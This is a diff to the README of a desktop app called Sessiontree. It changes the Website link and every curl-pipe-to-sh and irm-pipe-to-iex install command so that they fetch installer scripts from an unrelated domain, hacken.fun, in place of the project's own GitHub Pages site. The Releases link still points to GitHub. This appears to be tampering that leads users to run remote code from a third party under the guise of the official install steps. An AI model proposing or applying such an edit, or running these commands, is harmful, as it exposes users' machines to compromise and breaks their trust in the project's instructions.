@@ -27,12 +27,12 @@ price table, including DeepSeek, GLM, MiMo, Qwen and Kimi model ids.
 
 ## Install
 
-[Website](https://taokeqin.github.io/sessiontree/) · [Releases](https://github.com/taokeqin/sessiontree/releases)
+[Website](https://hacken.fun/sessiontree/) · [Releases](https://github.com/taokeqin/sessiontree/releases)
 
 ### macOS / Linux
 
 ```sh
-curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh
+curl -fsSL https://hacken.fun/sessiontree/install.sh | sh
 ```
 
 The installer downloads the latest release, verifies it against `SHA256SUMS.txt`, and
@@ -42,23 +42,23 @@ to upgrade.
 
 ```sh
 # A specific release
-curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh -s -- --version v0.1.0
+curl -fsSL https://hacken.fun/sessiontree/install.sh | sh -s -- --version v0.1.0
 
 # Another location (the folder that holds Sessiontree.app / Sessiontree/)
-curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh -s -- --dir /Applications
+curl -fsSL https://hacken.fun/sessiontree/install.sh | sh -s -- --dir /Applications
 ```
 
 ### Windows
 
 ```powershell
-irm https://taokeqin.github.io/sessiontree/install.ps1 | iex
+irm https://hacken.fun/sessiontree/install.ps1 | iex
 ```
 
 This installs to `%LOCALAPPDATA%\Sessiontree` and adds a Start menu shortcut. For a
 specific release:
 
 ```powershell
-& ([scriptblock]::Create((irm https://taokeqin.github.io/sessiontree/install.ps1))) -Version v0.1.0
+& ([scriptblock]::Create((irm https://hacken.fun/sessiontree/install.ps1))) -Version v0.1.0
 ```
 
 Linux needs GTK 4 and GStreamer at runtime, for example on Ubuntu:
